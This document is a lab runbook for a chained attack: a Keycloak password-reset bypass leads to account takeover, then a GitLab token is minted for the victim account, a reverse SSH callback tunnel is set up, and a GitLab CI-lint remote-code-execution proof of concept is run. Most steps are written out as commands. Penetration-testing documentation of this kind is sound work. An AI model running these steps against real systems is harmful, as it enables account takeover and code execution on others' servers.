# Keycloak to GitLab: a chained account-takeover and CI-lint exploitation lab

## Scope and prerequisites

This writeup describes an authorized laboratory chain:

1. Exploit a vulnerable Keycloak instance to reset a target user's password.
2. Sign in through GitLab's OIDC integration and obtain a Personal Access Token (PAT).
3. Run a GitLab proof of concept against a repository you control.
4. Observe the command execution as proof of the second-stage impact.

Replace the example addresses and names below with values from the lab inventory:

- **Target:** `<BOX_IP>`
- **Keycloak:** `<KEYCLOAK_URL>`, normally `http://<BOX_IP>:8080`
- **Realm:** `<REALM>`
- **OIDC client:** `<CLIENT_ID>`
- **Target account:** `<VICTIM_USER>`
- **GitLab:** `<GITLAB_URL>`, normally `http://<BOX_IP>`
- **Repository:** `<NAMESPACE>/<PROJECT>` and `<PROJECT_ID>`
- **Control workstation:** the machine that runs the PoCs and receives callbacks
- **SSH user:** `<BOX_SSH_USER>`


# Stage 1: Keycloak account takeover (CVE-2026-18963)

## PoC repository specification

Use a dedicated checkout for this vulnerability:

```text
Repository: CVE-2026-18963-keycloak
Expected entry point: exploit.py
Language/runtime: Python 3
Expected primary options:
  --base <KEYCLOAK_BASE_URL>
  --realm <REALM>
  --victim <VICTIM_USERNAME>
  --new-pass <NEW_PASSWORD>
```

The repository should be cloned separately from the GitLab PoC. It must not be mixed into the target GitLab project unless it is intentionally being used as lab evidence.

Install its documented dependencies, then run the script with lab values:

```bash
cd ~/CVE-2026-18963-keycloak
python3 exploit.py \
  --base "<KEYCLOAK_URL>/" \
  --realm "<REALM>" \
  --victim "<VICTIM_USER>" \
  --new-pass '<NEW_PASSWORD>'
```

A successful run normally demonstrates that the exploit reaches the password-update flow without a valid reset token. Do not treat an HTTP 200 or a generic selector response as success; look for the script's explicit exploitation confirmation and then verify that login succeeds.

## Verification

For GitLab integration, open `<GITLAB_URL>` and authenticate through OIDC. If GitLab is configured to start OIDC automatically, the normal sign-in form may redirect or auto-submit to Keycloak.

If browser login stalls, refresh the page and retry. A successful login proves that the target account password was changed and that the GitLab OIDC mapping is using the same realm account.

# Stage 2: obtain a GitLab Personal Access Token

A PAT is needed so that the GitLab PoC can clone and push branches to the authorized test project. The account must have access to the project and the token must include repository write permissions.

Required scopes:

- `api`
- `read_user`
- `write_repository`

## Option A: create the token from the Rails console

Where SSH access is available to the lab operator:

```bash
ssh <BOX_SSH_USER>@<BOX_IP> \
  "sudo docker exec gitlab gitlab-rails runner 'u = User.find_by(username: \"<VICTIM_USER>\"); t = u.personal_access_tokens.create(scopes: [:api, :read_user, :write_repository], name: \"exploit-token\", expires_at: 1.year.from_now); puts t.token'"
```

Record the output securely:

```bash
export GL_TOKEN='<PAT_VALUE>'
export GIT_URL="http://<VICTIM_USER>:${GL_TOKEN}@<BOX_IP>/<NAMESPACE>/<PROJECT>.git"
```

Sanity-check API access:

```bash
curl -s \
  -H "PRIVATE-TOKEN: ${GL_TOKEN}" \
  "<GITLAB_URL>/api/v4/projects?search=<PROJECT_NAME>" |
  python3 -m json.tool
```

## Option B: create the token in GitLab

1. Sign in at `<GITLAB_URL>` with the newly controlled account.
2. Open the user access-token settings.
3. Give the token a descriptive name and a short lab lifetime.
4. Select `api`, `read_user`, and `write_repository`.
5. Copy the token immediately because GitLab only displays it once.

Do not place the PAT in shell history, source control, screenshots, or shared evidence where it can leak.

# Stage 3: prepare a callback bridge

The GitLab PoC normally serves a stage-two payload on the control workstation. GitLab runs in a container on the target, so a callback URL must be reachable from the container back to the control workstation.

A standard lab bridge has three parts:

1. The SSH server on the target permits remote port forwarding.
2. The GitLab container can resolve a short callback hostname.
3. A reverse SSH tunnel forwards the target-side callback port to the control workstation.

## Required callback properties

If the PoC uses a two-stage delivery mechanism, follow this design:

- Start the stage-two listener on the control workstation.
- Expose it as `<CALLBACK_HOST>:<CALLBACK_PORT>` from inside the GitLab container.
- Use a callback host and port accepted by the PoC without generating a malformed Git path.
- Keep the first-stage callback concise; a 28-byte delivery constraint may limit the host syntax.

For the lab runbook, the established value is:

```text
--callback-url 'l:8000'
--listen-host 0.0.0.0
--listen-port 8000
```

The short form is used because the PoC prepends the HTTP scheme internally for the first-stage command. Do not use `http://l:8000` as the callback argument unless the PoC explicitly documents that format; embedded `//` text can become invalid or oversized Git path components.

## Reverse-tunnel setup

Enable remote forwarding on the target:

```bash
ssh <BOX_SSH_USER>@<BOX_IP> "sudo sed -i 's/^#*GatewayPorts.*/GatewayPorts yes/' /etc/ssh/sshd_config; sudo systemctl restart sshd"
```

From the control workstation, establish the tunnel:

```bash
ssh -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes \
  -R '*:8000:localhost:8000' \
  <BOX_SSH_USER>@<BOX_IP> -N -f
```

Verify the listener is not limited to loopback:

```bash
ssh <BOX_SSH_USER>@<BOX_IP> "ss -tlnp | grep 8000"
```

The listening address should include `0.0.0.0:8000`, not only `127.0.0.1:8000`.

Inside the GitLab container, `l` should resolve to the Docker gateway, for example:

```text
172.17.0.1 l
```

The exact Docker gateway address can be discovered from the target host and should be added to the container's `/etc/hosts` through a bind-safe method.

# Stage 4: reset the test repository

Reset the project before every PoC attempt. If a previous run left payload files in the default branch, a second run may report a clean working tree and commit nothing.

Clone the project, remove everything except `README.md`, return `README.md` to a known-clean state, and force the result to `main`:

```bash
rm -rf /tmp/reset-gitlab
cd /tmp && git clone "$GIT_URL" reset-gitlab
cd reset-gitlab

git ls-files | grep -v '^README.md$' | xargs -r rm -f
rm -f .gitlab-ci.yml benign.yml
echo '# DevOps Configs' > README.md
git add -A
git -c user.name=Lab -c user.email=lab@localhost commit -m 'Clean reset'
git -c user.name=Lab -c user.email=lab@localhost push --force origin HEAD:main
```

Set `main` as the project's default branch if needed:

```bash
curl -s -X PUT \
  -H "PRIVATE-TOKEN: ${GL_TOKEN}" \
  -d 'default_branch=main' \
  "<GITLAB_URL>/api/v4/projects/<PROJECT_ID>" >/dev/null
```

Verify the checkout:

```bash
rm -rf /tmp/verify-clean
git clone --depth 1 "$GIT_URL" /tmp/verify-clean
find /tmp/verify-clean -mindepth 1 -maxdepth 1 -printf '%f\n'
```

The result should contain only the repository README file.

# Stage 5: GitLab CI-lint exploitation (CVE-2026-97229)

## PoC repository specification

Use a separate checkout for the GitLab vulnerability:

```text
Repository: CVE-2026-97229-PoC
Expected entry point: poc.py
Language/runtime: Python 3
Expected primary options:
  <GITLAB_URL>
  <PROJECT_ID>
  --git-url <FULL_AUTHENTICATED_GIT_URL>
  --callback-url <CALLBACK_HOST>:<CALLBACK_PORT>
  --cmd <COMMAND>
  --listen-host <LISTEN_ADDRESS>
  --listen-port <LISTEN_PORT>
  --timeout <SECONDS>
  --insecure
```

Install the repository's dependencies and confirm the script's built-in help before running it:

```bash
cd ~/CVE-2026-97229-PoC
python3 -m pip install -r requirements.txt
python3 poc.py --help
```

Run against the authorized project:

```bash
python3 poc.py "<GITLAB_URL>" "<PROJECT_ID>" \
  --git-url "$GIT_URL" \
  --callback-url 'l:8000' \
  --cmd 'id' \
  --listen-host 0.0.0.0 \
  --listen-port 8000 \
  --timeout 150 \
  --insecure
```

The first-stage delivery can return HTTP 502 or another gateway error. This is not necessarily an exploitation failure: in the lab behavior, Puma can stop responding after executing the second-stage command and restart afterward. Command output received through the callback listener is the stronger success signal.

## Interpreting the result

A successful run generally demonstrates all of these:

- The PoC can access the project through the supplied authenticated Git URL.
- It can push or create the vulnerable attacker reference.
- The CI-lint delivery request reaches the affected code path.
- The callback listener receives command output from the service account.

Example proof:

```text
uid=<git_uid>(git) gid=<git_gid>(git) groups=<git_gid>(git)
```

Additional low-risk verification commands include:

```text
id
uname -a
hostname
```

Avoid sensitive commands unless they are explicitly within the exercise scope. Do not copy credentials or private files merely because the PoC can read them.


Finally, restore the test repository to a clean state and remove local exports:

```bash
unset GL_TOKEN GIT_URL
rm -rf /tmp/reset-gitlab /tmp/verify-clean
```
